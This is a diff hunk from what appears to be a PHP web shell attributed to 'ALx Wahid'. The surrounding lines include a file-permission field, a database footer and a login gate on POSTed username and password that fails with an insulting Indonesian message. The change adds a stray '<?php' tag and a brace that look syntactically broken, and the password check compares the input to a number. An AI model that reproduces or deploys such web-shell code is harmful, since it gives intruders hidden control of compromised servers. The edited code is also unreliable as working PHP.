@@ -5635,6 +5635,7 @@ Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o
 		}
 	echo "<center>Database: ".date("D/M/Y")." - <a href='http://alxwahid.blogspot.pe/' target='_blank'><font color=red>ALx Wahid</font></a></center>";
 }
-if(isset($_POST['pass']) && !empty($_POST['pass']) && isset($_POST['username']) && !empty($_POST['username']) ){ $pass = $_POST['pass']; $user = $_POST['username']; if($pass > 50){ die("<center><b><font color='red'>Password yang Anda masukkan salah Goblok..!".$warn."</font></b></center> ");
+<?php
+} if(isset($_POST['pass']) && !empty($_POST['pass']) && isset($_POST['username']) && !empty($_POST['username']) ){ $pass = $_POST['pass']; $user = $_POST['username']; if($pass > 50){ die("<center><b><font color='red'>Password yang Anda masukkan salah Goblok..!".$warn."</font></b></center> ");
 ?>
 </html>
